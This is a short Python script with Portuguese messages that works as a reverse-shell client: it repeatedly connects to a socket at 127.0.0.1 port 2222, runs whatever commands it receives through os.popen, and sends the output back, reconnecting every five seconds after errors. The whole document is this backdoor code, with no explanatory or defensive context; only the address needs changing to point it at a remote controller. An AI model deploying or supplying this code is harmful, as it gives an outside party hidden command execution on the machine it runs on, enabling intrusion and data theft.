import socket
import os
import time

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:

            try:
                client.connect(("127.0.0.1", 2222))

                while True:
                    datas = client.recv(2048).decode()
                    if datas == "sair":
                        client.close()
                        break

                    r_command = os.popen(datas).read()
                    client.sendall(r_command.encode())

            except Exception as msg:
                print(msg)

            finally:
                client.close()

    except:
        print("Erro")
        time.sleep(5)
        continue
